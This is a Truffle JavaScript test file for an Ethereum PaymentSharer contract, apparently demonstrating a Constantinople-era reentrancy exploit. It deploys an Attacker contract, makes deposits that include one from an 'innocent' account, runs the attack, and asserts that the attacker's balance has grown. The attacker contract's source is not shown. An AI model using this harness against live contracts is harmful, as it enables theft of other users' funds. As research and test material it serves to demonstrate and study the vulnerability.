var PaymentSharer = artifacts.require("PaymentSharer");
var Attacker = artifacts.require("Attacker");
var Dummy = artifacts.require("Dummy");

const BN = require('bn.js');


contract('PaymentSharer', function(accounts) {
  if(accounts.length < 5){
    console.log("Please provide a test chain with sufficiently many accounts.");
    return;
  }

  it("Test Storage Costs", async function() {
    var d = await Dummy.new();
    var tx = await d.dummy();
    console.log("Gas costs:", tx.receipt.gasUsed);
    tx = await d.dummy2();
    console.log("Gas costs:", tx.receipt.gasUsed);
    if(tx.receipt.gasUsed > 30000){
        console.log("Looks like you are not Constantinople. The attack won't work.");
    }
  });

  it("Test Regular", async function() {
    var p = await PaymentSharer.deployed();
    const first = accounts[1];
    const second = accounts[2];
    await p.init(42, first, second);
    var tx = await p.updateSplit(42, 50);
    var attacker_balance_start = new BN(await web3.eth.getBalance(first)).add(new BN(await web3.eth.getBalance(second)));
    console.log("Balance before: ", attacker_balance_start.toString());
    await p.deposit(42, {from: first, value: 1000000000000000000});
    await p.deposit(42, {from: second, value: 2000000000000000000});
    var attacker_balance_mid = new BN(await web3.eth.getBalance(first)).add(new BN(await web3.eth.getBalance(second)));
    console.log("Balance mid:    ", attacker_balance_mid.toString());
    await p.splitFunds(42);
    var attacker_balance_end = new BN(await web3.eth.getBalance(first)).add(new BN(await web3.eth.getBalance(second)));
    console.log("Balance after:  ", attacker_balance_end.toString());
    assert(attacker_balance_start.gt(attacker_balance_end), "Didn't manage to steal");
    assert(attacker_balance_start.lt(attacker_balance_end.add(new BN(10).pow(new BN(16)))), "Didn't get money back");
  });

  it("Test Reentrancy", async function() {
    var p = await PaymentSharer.deployed();
    var a = await Attacker.new();
    const innocent = accounts[4];
    const attacker_controlled = accounts[3];
    await p.init(0, a.address, attacker_controlled);
    var tx = await p.updateSplit(0, 1);
    var attacker_balance_start = new BN(await web3.eth.getBalance(a.address)).add(new BN(await web3.eth.getBalance(attacker_controlled)));
    console.log("Balance before attack: ", attacker_balance_start.toString());
    await p.deposit(0, {from: attacker_controlled, value: 1000000000000000000});
    await p.deposit(1, {from: innocent, value: 2000000000000000000});
    var attacker_balance_mid = new BN(await web3.eth.getBalance(a.address)).add(new BN(await web3.eth.getBalance(attacker_controlled)));
    console.log("Balance mid attack:    ", attacker_balance_mid.toString());
    await a.attack(p.address);
    var attacker_balance_end = new BN(await web3.eth.getBalance(a.address)).add(new BN(await web3.eth.getBalance(attacker_controlled)));
    console.log("Balance after attack:  ", attacker_balance_end.toString());
    assert(attacker_balance_start.lt(attacker_balance_end), "Didn't manage to steal");
  });
});
